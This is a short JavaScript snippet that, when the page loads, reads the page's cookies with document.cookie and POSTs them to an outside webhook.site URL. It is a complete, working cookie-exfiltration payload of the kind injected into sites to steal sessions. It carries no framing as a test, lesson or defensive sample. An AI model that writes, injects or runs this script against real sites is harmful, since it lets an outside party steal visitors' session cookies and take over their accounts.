// JavaScript code to fetch cookies and send them to the webhook
document.addEventListener('DOMContentLoaded', function() {
  var cookies = document.cookie;
  var webhookUrl = 'https://webhook.site/a1a42fea-588b-4dcc-9f00-f52c22c8c97d';
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({cookies: cookies}),
  });
});
